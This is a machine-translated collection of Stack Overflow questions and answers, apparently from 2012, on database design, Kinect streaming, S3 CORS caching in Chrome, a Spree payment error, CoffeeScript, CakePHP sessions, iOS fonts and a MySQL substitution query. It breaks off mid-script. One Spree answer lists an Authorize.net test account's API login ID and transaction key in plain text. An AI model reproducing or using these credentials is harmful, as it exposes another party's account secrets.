在我的网站上，我将允许用户将文本插入多个 WYSIWYG(TinyMCE) 文本字段。每个字段都有一个标题，用于导航和一般识别。

**正在输入数据库的内容：** 多个：来自输入的文本（最多 255 个字符） 多个：来自 WYSIWYG 编辑器的 HTML/文本（没有最大设置）（可能多达 20 个左右的文本和文本字段）

**我的问题是：**设置数据库以处理用户生成的内容的正确方法是什么（我应该为文本或其他内容制作 20 列）？我应该以什么形式将它发送到数据库（只需将它全部放入一个数组并将其发送到数据库或什么）？我应该限制每个文本字段中可以有多少文本？

使用：使用 phpMyAdmin 也使用 CodeIgniter 作为我的 php 框架

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:23:50.800

首先，您的框架和 phpmyadmin 的使用是无关紧要的，但可以肯定的是，为什么不两者都使用呢？他们只是偏爱你，CI 将处理相当大的项目。

话虽如此，我建议您在这种情况下使用关系数据库。您可以根据自己的选择对其进行缩放，因此对于您的示例，我们假设关系是特定的，就像您有一篇文章以及与这些文本字段的许多关系，这些文本字段始终是文本字段。我的意思是它不是任何表单元素类型和任何长度和值的大量混合。最后，您应该将其设置为做您需要的事情，而不会出现大量过度杀伤或腐败限制，例如在您的文章中添加 20 个文本字段并且不使用关系系统。

建立这样的系统非常容易。我会解释结构，但我假设您了解关系数据库架构的概念。我会提供一个链接，但老实说，只是搜索该术语应该提供大量资源来填补任何混淆。

如果您有具体问题，我可能会更新此帖子。

**编辑**

相信我，这不会被认为是更大的规模。您极不可能创建一个具有足够关系字段的单个输入表单，从而仅通过这个细节来削弱性能。假设您甚至有 10 个文本字段。您更大的问题是 tinyMCE 或您使用的任何 WYSIWYG 编辑器是否可以顺利处理这么多实例。我从来没有一次使用过两个以上，所以我不了解自己。我会假设你会很安全。

获取关系数据所需的时间很大程度上取决于您编写查询的方式。我认为 CI 有一个数据库 ORM 系统，您可以使用它来帮助解决这个问题，这样您就不会愚蠢地编写一个嵌套在其他 IN 选择中的疯狂 IN 选择的查询......例如。在任何情况下，您都需要绝对荒谬的关系才能减慢正确编写的查询。如果您的表单那么大，请将其拆分为页面。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-29T00:43:01.463

您留下了很多未说明的要求，因此很难具体说明。

但是，如果我在 MySQL 中工作，这就是我会做的事情。

发布表：

```
 post_id    int      primary key   an id number
 field      int      not null      which of the 20 or so text fields this goes with
 user_id    int      not null fk   the user making the post
 active     tinyint                1 = active   2 = invisible to users (deleted)
 (other identifying data as needed)
 posttime   datetime not null      when the post was first created
 edittime   datetime not null      when the post was most recently changed 
                                    (if never changed, the same as posttime)
 title      varchar                text of the post's title 
```

POSTTEXT 表

```
 post_id      int       part of primary key
 posttext_id  int       part of primary key 
 posttext     text      part or all of the post's text
 active       tinyint   1 = active   2 = invisible to users (deleted) 
```

因此，每个帖子在 POST 中将有一行，在 POSTTEXT 中将有零或多行。大多数帖子在 POSTTEXT 中只有一行，但超长帖子可能有几行。POSTTEXT.post_id 是指向 POST.post_id 的外键。posttext_id 是每个不同帖子从零开始计数的数字。

为什么，你问，不只是把 posttext 列放在 POST 表中？好吧，如果你确定你永远不需要让你的用户浏览很长的帖子，你可以这样做。您的架构会简单得多。但是如果系统中有很多十万字的帖子，用户可能想查看第n页的文本，那么两表解决方案会更好。

这种事情会比具有多个字段的多个文本列的表格执行得更好。在 RDMS 工作中，处理多个相似的行几乎总是比处理具有大量列的真正宽行要好。

# c# - 通过网络从 Xbox Kinect 流式传输视频

> ID：12648808
> 
> 赞同：4
> 
> 时间：2012-09-29T00:12:20.920
> 
> 标签：c#, networking, compression, kinect, tcpclient

我正在尝试通过 LAN 从 Xbox Kinect 流式传输视频。我编写了一个套接字类，它在连接良好的情况下以每秒约 25 兆位的速度发送，在连接不良的情况下以每秒约 1 兆位的速度发送。这将在机器人上进行，因此我将以 1Mbps 的速度拍摄，并且我希望以最小的延迟获得 15 FPS。从相机获取 YUV 格式 (http://msdn.microsoft.com/en-us/library/jj131027.aspx) 它需要每像素 4 位。我会将分辨率降低到 320 x 240。所以让我计算一帧 (320 * 240 * 4 / 1024 / 1024) = 0.29296875 Mbs，这意味着如果我只能以 1Mbps 的速度发送，我可以以 3.4 FPS 的速度流式传输. 所以我需要将字节数组减少到大约五分之一的大小。我之前研究过这个，但实际上压缩字节数组、发送它然后解压缩数组比只发送原始数据需要更长的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:35:07.163

他们不是叫视频编解码器吗？

如果您不将数据视为视频，您将会错过......它比原始数据更可压缩。有许多编解码器适用于各种应用程序。选择通常是处理成本和带宽之间的折衷。这完全取决于您的机器人在通过网络启动数据之前可以完成多少繁重的工作。

# javascript - 缓存图像的 CORS 策略

> ID：12648809
> 
> 赞同：59
> 
> 时间：2012-09-29T00:12:34.703
> 
> 标签：javascript, html, canvas, amazon-s3, cross-domain

在 chrome 22 和 safari 6 中。

使用启用 CORS 的 S3 存储桶从 s3 加载图像以在画布中使用（将提取作为主要意图），代码如下：

```
<!-- In the html -->
<img src="http://s3....../bob.jpg" /> 

// In the javascript, executed after the dom is rendered
this.img = new Image();
this.img.crossOrigin = 'anonymous';
this.img.src = "http://s3....../bob.jpg"; 
```

我观察到以下情况：

1.  禁用缓存
2.  一切正常，两个图像都加载

然后尝试启用缓存：

1.  启用缓存
2.  DOM 图像加载，画布图像创建 dom 安全异常

如果我修改代码的 javascript 部分以附加查询字符串，如下所示：

```
this.img = new Image();
this.img.crossOrigin = 'anonymous';
this.img.src = "http://s3....../bob.jpg?_"; 
```

一切正常，即使完全启用缓存。通过使用 http 代理并观察到在失败的情况下，实际上并没有从服务器请求图像，我了解到缓存是一个问题。

我不得不得出的结论是图像缓存正在保存原始请求标头，然后将其用于后续启用 CORS 的请求 - 由于违反同源策略而产生了安全异常。

这是预期的行为吗？

编辑：在 Firefox 中工作。

Edit2：s3 存储桶上的 Cors 策略

```
<?xml version="1.0" encoding="UTF-8"?>
<CORSConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <CORSRule>
        <AllowedOrigin>*</AllowedOrigin>
        <AllowedMethod>GET</AllowedMethod>
    </CORSRule>
</CORSConfiguration> 
```

我正在使用全开，因为我现在只是在本地盒子上进行测试。这还没有生产。

Edit3：更新了 cors 政策以指定来源

```
<?xml version="1.0" encoding="UTF-8"?>
<CORSConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <CORSRule>
        <AllowedOrigin>http://localhost:5000</AllowedOrigin>
        <AllowedMethod>GET</AllowedMethod>
    </CORSRule>
</CORSConfiguration> 
```

已验证的传出标头：

```
Origin  http://localhost:5000
Accept  */*
Referer http://localhost:5000/builder
Accept-Encoding gzip,deflate,sdch
Accept-Language en-US,en;q=0.8
Accept-Charset  ISO-8859-1,utf-8;q=0.7,*;q=0.3 
```

传入标头：

```
Access-Control-Allow-Origin http://localhost:5000
Access-Control-Allow-Methods    GET
Access-Control-Allow-Credentials    true 
```

如果我在加载到画布时没有破坏缓存，chrome 仍然会失败。

编辑4：

刚刚在失败案例中注意到了这一点。

传出标头：

```
GET /373c88b12c7ba7c513081c333d914e8cbd2cf318b713d5fb993ec1e7 HTTP/1.1
Host    amir.s3.amazonaws.com
User-Agent  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.91 Safari/537.4
Accept  */*
Referer http://localhost:5000/builder
Accept-Encoding gzip,deflate,sdch
Accept-Language en-US,en;q=0.8
Accept-Charset  ISO-8859-1,utf-8;q=0.7,*;q=0.3
If-None-Match   "99c958e2196c60aa8db385b4be562a92"
If-Modified-Since   Sat, 29 Sep 2012 13:53:34 GMT 
```

传入标头：

```
HTTP/1.1 304 Not Modified
x-amz-id-2  3bzllzox/vZPGSn45Y21/vh1Gm/GiCEoIWdDxbhlfXAD7kWIhMKqiSEVG/Q5HqQi
x-amz-request-id    48DBC4559B5B840D
Date    Sat, 29 Sep 2012 13:55:21 GMT
Last-Modified   Sat, 29 Sep 2012 13:53:34 GMT
ETag    "99c958e2196c60aa8db385b4be562a92"
Server  AmazonS3 
```

我*认为*这是第一个请求，由 dom 触发。我不知道这不是javascript请求。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2016-05-26T08:09:56.923

问题是图像是从以前的请求中缓存的，没有所需的 CORS 标头。因此，当您再次请求它时，对于画布，指定了“crossorigin”，浏览器使用缓存版本，看不到必要的标头，并引发 CORS 错误。当您将“？_”添加到 url 时，浏览器会忽略缓存，因为这是另一个 URL。看看这个线程： [https ://bugs.chromium.org/p/chromium/issues/detail?id=409090](https://bugs.chromium.org/p/chromium/issues/detail?id=409090)

Firefox 和其他浏览器没有这个问题。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2018-07-27T11:14:52.490

所描述的行为似乎是合乎逻辑的，因为缓存条目键是目标 URI（请参阅[7234 超文本传输​​协议（HTTP/1.1）：缓存](https://www.rfc-editor.org/rfc/rfc7234#section-2)）。要解决此问题并有效使用缓存，您需要使图像托管服务器在两种情况下都给出相同的响应。

一种选择是让用户代理`Origin`在第一个请求中也发送 HTTP 标头（假设带有键`targetUri`的响应尚未在缓存中）：

```
<img src="targetUri" crossorigin="anonymous" /> 
```

另一种选择是配置图像托管服务器以发送与 CORS 相关的 HTTP 标头，无论请求是否包含`Origin`HTTP 标头。有关更多信息，请参阅[S3 CORS，请始终在 StackOverflow 上发送 Vary: Origin](https://stackoverflow.com/questions/31732533/s3-cors-always-send-vary-origin)讨论。

您还可以使用响应 HTTP 标头通知用户代理响应对`Origin`请求 HTTP 标头敏感`Vary`。缺点是用户代理可能`Vary`仅将标头用作响应验证器（而不是作为缓存条目键的一部分）并且仅存储目标 URI 的单个响应实例，这使得更难有效地使用缓存。有关更多信息，请查看Mark Nottingham 重新访问的文章[浏览器缓存状态。](https://www.mnot.net/blog/2017/03/16/browser-caching#vary)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T01:09:25.660

您应用了哪些 CORS 设置？[This post](https://forums.aws.amazon.com/thread.jspa?threadID=103402)建议*解析*`AllowedOrigin`通配符（而不是逐字发送，这似乎是未记录的行为）；然后为后续请求缓存标头值，从而导致类似于您报告的问题。*`Access-Control-Allow-Origin`*

# spree - spree：缺少必需的参数：login

> ID：12648813
> 
> 赞同：1
> 
> 时间：2012-09-29T00:13:52.457
> 
> 标签：spree

我刚刚继承了一个有问题的狂欢项目。结账时，用户提供信用卡信息后，系统出现 rails 异常。我正在寻找有关可能需要登录参数的指导。我正在快速了解 spree 的工作原理，因此任何指导都会有所帮助。谢谢！

```
Started PUT "/checkout/update/payment" for 107.3.138.229 at 2012-09-28 08:52:11 -0700
Processing by Spree::CheckoutController#update as HTML
  Parameters: {"utf8"=>"✓", "authenticity_token"=>"XXXXXXX=", "order"=>{"payments_attributes"=>[{"payment_method_id"=>"2"}], "coupon_code"=>""}, "payment_source"=>{"2"=>{"number"=>"[FILTERED]", "month"=>"X", "year"=>"XXXX", "verification_value"=>"XXX", "first_name"=>"XXX", "last_name"=>"XXX"}}, "commit"=>"Save and Continue", "state"=>"payment"}
Completed 500 Internal Server Error in 464ms

ArgumentError (Missing required parameter: login):
  active_utils (1.0.4) lib/active_utils/common/requires_parameters.rb:11:in `block in requires!'
  active_utils (1.0.4) lib/active_utils/common/requires_parameters.rb:4:in `each'
  active_utils (1.0.4) lib/active_utils/common/requires_parameters.rb:4:in `requires!'
  activemerchant (1.20.4) lib/active_merchant/billing/gateways/authorize_net.rb:74:in `initialize'
  spree_core (1.1.3) app/models/spree/gateway.rb:25:in `new'
  spree_core (1.1.3) app/models/spree/gateway.rb:25:in `provider'
  spree_core (1.1.3) lib/spree/core/delegate_belongs_to.rb:82:in `delegator_for'
  spree_core (1.1.3) lib/spree/core/delegate_belongs_to.rb:44:in `block (2 levels) in delegate_belongs_to'
  spree_core (1.1.3) app/models/spree/payment/processing.rb:128:in `block in gateway_action'
  spree_core (1.1.3) app/models/spree/payment/processing.rb:172:in `protect_from_connection_error'
  spree_core (1.1.3) app/models/spree/payment/processing.rb:125:in `gateway_action'
  spree_core (1.1.3) app/models/spree/payment/processing.rb:22:in `authorize!'
  spree_core (1.1.3) app/models/spree/payment/processing.rb:11:in `process!'
  activerecord (3.2.8) lib/active_record/associations/collection_proxy.rb:89:in `each'
  activerecord (3.2.8) lib/active_record/associations/collection_proxy.rb:89:in `method_missing'
  spree_core (1.1.3) app/models/spree/order.rb:380:in `process_payments!'
  spree_core (1.1.3) app/models/spree/order.rb:83:in `block (2 levels) in <class:Order>' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T01:06:21.653

我猜你的 authorize_net 模块没有提供所需的配置。和/或没有为您的环境提供配置（网关配置是基于每个环境提供的，因此如果您加载生产数据库配置并在开发中运行，您可能没有所需的配置）。

为了获得全局，authorize_net 模块是[active_merchant](http://activemerchant.org/) gem（Shopify 的结帐模块）的一部分，并在[spree_gateway](https://github.com/spree/spree_gateway/blob/master/app/models/spree/gateway/authorize_net.rb)中为 Spree 扩展，并且 active_merchant 的配置由 Spree 管理并存储在数据库中。

[Spree 指南](https://guides.spreecommerce.com/developer/payments.html#specifying-configuration-options)中提供了一个配置示例：

```
# gateway/authorize_net.rb
class Gateway::AuthorizeNet < Gateway
    preference :login, :string
    preference :password, :string

    def provider_class
        ActiveMerchant::Billing::AuthorizeNetGateway
    end
end 
```

然后，您可以从管理面板设置登录名/密码或自动播种。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T11:52:36.863

我在使用 autorize.net 网关作为我的付款方式时遇到了同样的问题。在我看到没有登录名和密码之前，由于这个 rails 异常来了。然后我在 authorize.net 上创建了测试帐户，并在管理员上设置了这个帐户登录 ID 和密钥authorize.net 配置和解决问题的一面。

```
 Card Not Present Test Account

          API Login ID 3cm2NkD3GyyyW

          Transaction Key 6v7CEMcRq5H74p5yyg   #as password 
```

在提供测试帐户凭据之前，甚至与贝宝相同的错误

希望帮助别人

# audio - SimpleAudioEngine 非异常断点

> ID：12648816
> 
> 赞同：1
> 
> 时间：2012-09-29T00:14:11.347
> 
> 标签：audio, cocos2d-iphone, simpleaudioengine

[断点 http://dl.dropbox.com/u/60578443/exception_breakpoint.png](http://dl.dropbox.com/u/60578443/exception_breakpoint.png) [异常 http://dl.dropbox.com/u/60578443/simpleaudioengine_exception.png](http://dl.dropbox.com/u/60578443/simpleaudioengine_exception.png)

我在 cocos2d 的 SimpleAudioEngine 中遇到了一个问题。

如图所示，我添加了一个断点，每次异常发生时暂停代码。然后每次我需要播放音频效果时，它都会暂停。还有它们的几个断点。这样有点不方便。我怎样才能避免这些异常除了我需要启用的例外情况？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T01:02:01.473

将您的异常更改为 Objective-C 而不是全部。那为我修好了。

![断点](../Images/63699fd20cb194ee9e2b61ca14422557.png)

# javascript - CoffeeScript 函数编译错误并提前返回

> ID：12648817
> 
> 赞同：0
> 
> 时间：2012-09-29T00:14:15.187
> 
> 标签：javascript, coffeescript

我正在用 CoffeeScript 编写一些代码，但我不知道如何以正确编译的方式编写它。

```
 f = (id) -> 
        matching = app.list.where
            id: id

        if matching.length == 0
            success = (data)->
                if not data[id]
                    alert "couldn't find id " + id
                else
                    b = new Thing data[id]
                    b.set 'id',id 
                    b.trigger 'select'

            error = ->

            app.api.request 'info','GET',success,error,
                ids: id
        else
            b = matching[0]
            b.trigger 'select' 
```

正在编译为：

```
 f = function(id) {
    var matching;
    return matching = app.list.where({
      id: id
    });
  };
  if (matching.length === 0) {
    success = function(data) {
      var b;
      if (!data[id]) {
        return alert("couldn't find id " + id);
      } else {
        b = new Thing(data[id]);
        b.set('id', id);
        return b.trigger('select');
      }
    };
    error = function() {};
    app.api.request('info', 'GET', success, error, {
      ids: id
    });
  } else {
    b = matching[0];
    b.trigger('select');
  } 
```

如您所见，只有 的分配`matching`被解析为`f`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:20:19.013

```
f = (id) -> 
    matching = app.list.where id: id
    if matching.length == 0
        success = (data)->
            if not data[id]
                alert "couldn't find id " + id
            else
                b = new Thing data[id]
                b.set 'id',id 
                b.trigger 'select'

        error = ->

        app.api.request 'info','GET',success,error,
            ids: id
    else
        b = matching[0]
        b.trigger 'select' 
```

# session - cakephp 会话在共享主机上不起作用（godaddy，ICDsoft）

> ID：12648818
> 
> 赞同：0
> 
> 时间：2012-09-29T00:14:34.537
> 
> 标签：session, cakephp, shared, host

我有一个使用 Cakephp 开发的应用程序。该会话在本地主机上也可以正常工作。我看到可以设置会话，并在 localhost 中读取，我还可以看到会话文件创建为 php.ini 中定义的 sesssion_save_path。

首先，我写了一个小的会话检查 php 文件来测试共享主机，我 100% 确定共享主机在会话中没有问题。

但是，会话似乎无法在共享主机上运行。我可以设置一个会话，我也可以看到在主机上创建的会话文件，但是当我刷新它时，执行：$this->Session->read("User.id"); $this->Session->check("User.id");

空无一物。

我应该怎么办？它与 cakephp 缓存有关吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-15T10:01:42.063

首先我们要提一下，我们不是 CakePHP 专家，所以我们可能无法提供最佳答案。

我们使用以下示例脚本/控制器在共享主机环境中测试了 CakePHP 2.2 中的会话：

```
 public function index() {//The default action for a CakePHP controller
    CakeSession::start();

    echo 'Hello world.<hr/>';

    // test that the session actually works
    $counter = 0;
    if ( $this->Session->check('counter') ) {
      $counter = $this->Session->read('counter');
    } else {
      echo 'Creating session' . PHP_EOL;
    }

    ++$counter;

    $this->Session->write('counter', $counter);

    echo "You were here {$counter} time(s)\n\n";
    var_dump($this->Session->read('counter'));
  } 
```

似乎会话数据已正确保存和读取。如果您在 ICDSoft 服务器上安装 CakePHP 时仍有问题，我们建议您联系我们的支持团队。我们可能并不总是能够提供适当的调试支持，但我们总是愿意尝试。

此致，

ICDSoft 团队

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-15T12:38:52.087

查看分配给浏览器的 CakePHP cookie 以查看会话 ID 是否不断变化。如果是这样，那么您的会话不会被持久化。

其次，可能值得检查`$_SESSION`超全局是否也可用。

# ios - ios 哪些字体可以在付费 ios 应用程序中免费使用？

> ID：12648819
> 
> 赞同：0
> 
> 时间：2012-09-29T00:14:39.183
> 
> 标签：ios

ios 哪些字体可以在付费 ios 应用程序中免费使用？我可以在我的 ios 应用程序中使用所有的 macfonts 吗？是否有它的列表，请我的应用程序已完成，但在解决此问题之前我无法发布它？

我的应用程序在某些地方使用 systemdefult 字体，但我在 Photoshop 中将按钮制作为 png 文件，我需要在 Photoshop 中制作按钮时选择免费字体。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T00:16:43.823

如果字体包含在 iOS 中，那么您可以自由使用它。

如果字体不包含在 iOS 中，您需要在将其与您的应用程序一起分发之前咨询字体的许可证。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:23:45.993

您可能会发现[FontSquirrel](http://www.fontsquirrel.com/)是 True Type 字体的好资源。他们说他们的字体是“免费的”用于商业用途，但我仍然会详细阅读许可证。

# mysql - 具有复杂“if/else”要求的 SQL SELECT 语句

> ID：12648821
> 
> 赞同：1
> 
> 时间：2012-09-29T00:15:07.287
> 
> 标签：mysql, sql, lookup-tables

我正在使用 MySQL 数据库，这是我的情况：

我需要一个选择查询才能获得可以使用 N 个耗材完成的项目列表，其中 N 是耗材数组。此项目列表必须包括可以使用任何或所有 N 个耗材完成的所有项目，但不能包括任何需要 N 中未列出的耗材*的项目。但是，铅笔可以用钢笔代替。如果查询搜索可以使用铅笔、钢笔和卷笔刀完成的项目，那么“制作草图”不应该作为可以完成的项目返回，即使它使用了一些列出的用品）*

此外，某些项目所需的一些用品可以用其他用品代替；但是，仅仅因为一个项目可以使用替代供应项目并不意味着另一个项目可以使用相同的替代品。*（例如，在锐化铅笔项目中，钢笔不能代替铅笔，但是，对于绘图它可以）*

这些是我的表：

```
Projects
+----+---------------------+
| id |        name         |
+----+---------------------+
|  1 | make sketch         |
|  2 | sharpen pencil      |
|  3 | make paper airplane |
+----+---------------------+

Supplies
+----+------------------+
| id |       name       |
+----+------------------+
|  1 | paper            |
|  2 | pencil           |
|  3 | pen              |
|  4 | pencil sharpener |
+----+------------------+

ProjectSupplies
+----+-----------+------------+
| id | projectid |  supplyid  |
+----+-----------+------------+
|  1 |         1 |          1 |
|  2 |         1 |          2 |
|  3 |         2 |          2 |
|  4 |         2 |          4 |
|  5 |         3 |          1 |
+----+-----------+------------+

SubstituteSupplies
+-------------------+------------+
| projectsuppliesid |  supplyid  |
+-------------------+------------+
|                 2 |          3 |
+-------------------+------------+ 
```

这些数据无论如何都不是详尽无遗的，但您应该明白这一点。

这是我在*更新数据库之前提出的查询*（请参阅下面的更新），但是，它违反了规则，因为查询结果包括需要纸张的项目，仅仅是因为`COUNT`它既是 supplyid 又是替代品作为两个单独的要求，而不是而不是简单地满足相同的供应要求。

```
SELECT projects.name FROM supplies
INNER JOIN projectsupplies ON supplyid = supplies.id OR substitute = supplies.id
INNER JOIN projects ON projects.id = projectid
WHERE supplies.id IN (2,3,4)
GROUP BY projects.name
HAVING COUNT(*) <= 3
ORDER BY projects.id 
```

**有没有办法扭转这个：**

```
INNER JOIN projectsupplies ON supplyid = supplies.id OR substitute = supplies.id 
```

**本质上是这样的：**

```
INNER JOIN projectsupplies ON (supplies.id = supplyid) ? (supplies.id = supplyid) : (supplies.id = substitute) 
```

**或类似于使用 if 语句或其他任何东西以使查询结果正确？**

**我遇到的一个问题是，上面的查询将返回“make sketch”作为一个有效的项目，即使在查询中指定，没有纸。**

最终目标是能够通过许多项目和许多供应大规模地实现这一目标。

**更新：**我在我的数据库设计中发现了一个问题，导致不可能允许供应有多个替代品。我更正了问题以允许许多替代品，并根据需要更新了上面的表格，所以现在`SELECT`上面的查询不再适用。但是，我仍然需要完成本文顶部提到的相同目标

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:33:29.863

查询级别的“OR”倾向于翻译为 UNION。

* * *

### 架构发生重大变化后

```
(SELECT projectid, supplyid FROM ProjectSupplies
 UNION
 SELECT ps.Projectid, ss.supplyid
   FROM SubstituteSupplies AS ss
   JOIN ProjectSupplies    AS ps
     ON ss.ProjectSuppliesID = ps.ID
) 
```

并将其插入更大的查询中：

```
SELECT p.id, p.name
  FROM supplies AS s
  JOIN (SELECT projectid, supplyid FROM ProjectSupplies
        UNION
        SELECT ps.Projectid, ss.supplyid
          FROM SubstituteSupplies AS ss
          JOIN ProjectSupplies    AS ps
            ON ss.ProjectSuppliesID = ps.ID
       )        AS ps ON s.id = ps.supplyid
  JOIN projects AS p  ON p.id = ps.projectid
 WHERE s.id IN (2,3,4)
 GROUP BY p.id, p.name
HAVING COUNT(*) <= 3
 ORDER BY p.id; 
```

（请注意，在这个阶段，我还没有验证查询的其余部分是否正确；我只讨论了如何将耗材和替代耗材加入到连接操作中。）

在 Mac OS X 10.7.5 上针对 IBM Informix Dynamic Server 11.70.FC2 运行时，示例数据和上述查询的输出为：

```
1   make sketch
2   sharpen pencil 
```

显然，这是不正确的；项目 1 需要完成纸张，但这不是可用的耗材之一，也没有可用的替代品。因此，外部查询也是无效的。

* * *

### 修复主查询

可以使用给定供应清单（此处为供应 2、3、4）完成的项目是那些所有必要供应或替代供应都在可用供应清单中的项目。一个问题是确保如果有可用的替代供应，但缺少一个不可替代的供应，则项目无法完成。

因此，例如，项目 1 需要 SupplyID 1 和 SupplyID 2 或替代 SupplyID 3 的供应；2 和 3 都可用的事实是不够的。在此示例中，只有一个替代品，但一般情况下，可能需要许多 SupplyID，其中许多可能有替代品。因此，需要相当小心。

### 应用测试驱动的查询设计 (TDQD)

当面对一个复杂的查询时，我一步一步地构建它。发现原来的主查询没有找到标记，我将不得不一步一步地构建它，结果有点复杂，但由于解释了这些步骤，所以可以理解。还有一个关键的设计步骤——算法的巧妙之处——要提出，但这需要经验。

一个标准是每个项目都需要拥有它使用的所有供应品。因此，我们需要知道每个项目需要多少不同的用品。这很简单：

```
SELECT ProjectID, COUNT(*) AS ItemCount
  FROM ProjectSupplies
 GROUP BY ProjectID; 
```

结果

```
1   2
2   2
3   1 
```

现在出现了神奇的成分：“SupplyGroup”。之前生成的 UNION 查询需要扩展以包含 SupplyGroup。SupplyGroup 对应于 ProjectSupplies 表中的 'desired' SupplyID；SupplyID 是符合项目等效标准的 SupplyID，并且与 ProjectSupplies 中的 SupplyID 相同，或者是 SubstituteSupplies 中的 SupplyID：

```
SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ps.SupplyID AS SupplyID
  FROM ProjectSupplies AS ps
UNION
SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ss.SupplyID AS SupplyID
  FROM SubstituteSupplies AS ss
  JOIN ProjectSupplies    AS ps
    ON ss.ProjectSuppliesID = ps.ID; 
```

结果

```
1   1   1
1   2   2
1   2   3
2   2   2
2   4   4
3   1   1 
```

现在我们需要生成可以从可用 SupplyID 列表`(2, 3, 4)`中满足的 ProjectID 和 SupplyGroup 列表：

```
SELECT DISTINCT ProjectID, SupplyGroup
  FROM (SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ps.SupplyID AS SupplyID
          FROM ProjectSupplies AS ps
        UNION
        SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ss.SupplyID AS SupplyID
          FROM SubstituteSupplies AS ss
          JOIN ProjectSupplies    AS ps
            ON ss.ProjectSuppliesID = ps.ID
       ) AS i
 WHERE i.SupplyID IN (2, 3, 4); 
```

结果

```
1   2
2   2
2   4 
```

而且，事实上，我们需要计算该列表中每个项目可用的不同供应组的数量：

```
SELECT ProjectID, COUNT(DISTINCT SupplyGroup) AS ItemCount
  FROM (SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ps.SupplyID AS SupplyID
          FROM ProjectSupplies AS ps
        UNION
        SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ss.SupplyID AS SupplyID
          FROM SubstituteSupplies AS ss
          JOIN ProjectSupplies    AS ps
            ON ss.ProjectSuppliesID = ps.ID
       ) AS i
 WHERE i.SupplyID IN (2, 3, 4)
 GROUP BY ProjectID; 
```

结果

```
2   2
1   1 
```

现在我们需要将第一个查询与项目 ID 和项目计数的第二个查询连接起来，并将其与项目表连接以列出项目名称：

```
SELECT p.ID, p.Name
  FROM (SELECT ProjectID, COUNT(DISTINCT SupplyGroup) AS ItemCount
          FROM (SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ps.SupplyID AS SupplyID
                  FROM ProjectSupplies AS ps
                UNION
                SELECT ps.ProjectID, ps.SupplyID AS SupplyGroup, ss.SupplyID AS SupplyID
                  FROM SubstituteSupplies AS ss
                  JOIN ProjectSupplies    AS ps
                    ON ss.ProjectSuppliesID = ps.ID
               ) AS i
         WHERE i.SupplyID IN (2, 3, 4)
         GROUP BY ProjectID
       ) AS z
  JOIN (SELECT ProjectID, COUNT(*) AS ItemCount
          FROM ProjectSupplies
         GROUP BY ProjectID
       ) AS y
    ON z.ProjectID = y.ProjectID AND z.ItemCount = y.ItemCount
  JOIN Projects AS p ON p.ID = z.ProjectID
 ORDER BY p.ID, p.Name; 
```

结果

```
2   sharpen pencil 
```

而且，鉴于数据，我相信这是正确的结果。

* * *

### 在架构发生重大变化之前

查询的原始版本针对的是不同的表结构，其中没有 SubstituteSupplies 表，并且 ProjectSupplies 表有一个额外的列`Substitute`，该列通常包含一个空值，但当它不为空值时，确定了一个替代供应。该问题也在`(2,3,4,5)`IN 列表中列出，并且与 4 进行比较，而不是 3。

您可能可以在子选择中使用两个内部联接的 UNION 来做到这一点：

```
(SELECT projectid, supplyid FROM ProjectSupplies
 UNION
 SELECT projectid, substitute FROM ProjectSupplies WHERE substitute IS NOT NULL
) 
```

这需要插入到您的主查询中：

```
SELECT p.name
  FROM supplies AS s
  JOIN (SELECT projectid, supplyid FROM ProjectSupplies
         UNION
        SELECT projectid, substitute AS supplyid
          FROM ProjectSupplies WHERE substitute IS NOT NULL
       )        AS ps ON s.id = ps.supplyid
  JOIN projects AS p  ON p.id = ps.projectid
 WHERE s.id IN (2,3,4,5)
 GROUP BY p.name
HAVING COUNT(*) <= 4
 ORDER BY p.id; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:25:44.870

希望这可以帮助

```
INNER JOIN projectsupplies ON supplies.id = IF(supplies.id = supplyid, supplyid, substitute) 
```

# javascript - javascript导航消失的问题

> ID：12648822
> 
> 赞同：3
> 
> 时间：2012-09-29T00:15:07.320
> 
> 标签：javascript, html, dreamweaver

我正在为一位朋友（他在一家律师事务所工作）进行一些网站更改，他的网站左侧有一个导航栏。悬停时，这些显示一个子菜单。不幸的是，他试图取出其中一个子菜单项并失去了子菜单导航的所有功能。现在，它不显示子菜单，只显示一个错误。

这是之前的代码（在哪里工作）：

```
<script language="JavaScript">
<!--
function mmLoadMenus() {
    if (window.mm_menu_0327091831_0) return;

    window.mm_menu_0327091831_0 = new Menu("root",225,30,"Optima, Verdana, Helvetica Neue, sans-serif",14,"#FFFFFF","#FFFFFF","#7E7D7D","#B3B3B3","left","middle",8,0,250,-5,7,true,false,true,0,true,true);

    mm_menu_0327091831_0.addMenuItem("HARRY&nbsp;GRIFF,&nbsp;P.C.","location='harry-griff.html'");
    mm_menu_0327091831_0.addMenuItem("DOUGLAS&nbsp;E.&nbsp;LARSON,&nbsp;P.C.","location='doug-larson.html'");
    mm_menu_0327091831_0.addMenuItem("STEPHEN&nbsp;L.&nbsp;LAICHE,&nbsp;P.C.","location='stephen-laiche.html'");
